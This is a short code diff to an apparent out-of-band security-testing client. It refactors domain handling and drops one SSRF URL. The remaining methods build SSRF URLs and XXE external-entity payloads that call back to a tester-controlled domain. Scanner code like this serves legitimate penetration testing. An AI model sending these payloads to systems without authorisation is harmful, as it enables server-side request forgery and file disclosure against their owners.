@@ -197,16 +197,15 @@ class OASTClient:
 
  def get_ssrf_payloads(self, token: str) -> list[str]:
   """Get SSRF payloads pointing to OAST token."""
-  domain = token if "." in token else f"{token}.{self.server}"
+  domain = self._registered_domain(token)
   return [
    f"http://{domain}/",
    f"https://{domain}/",
-   f"http://{domain}@127.0.0.1/",
   ]
 
  def get_xxe_payloads(self, token: str) -> list[str]:
   """Get XXE OOB payloads."""
-  domain = token if "." in token else f"{token}.{self.server}"
+  domain = self._registered_domain(token)
   return [
    f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % xxe SYSTEM "http://{domain}/xxe"> %xxe;]><r/>',
    f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://{domain}/xxe">]><r>&xxe;</r>',
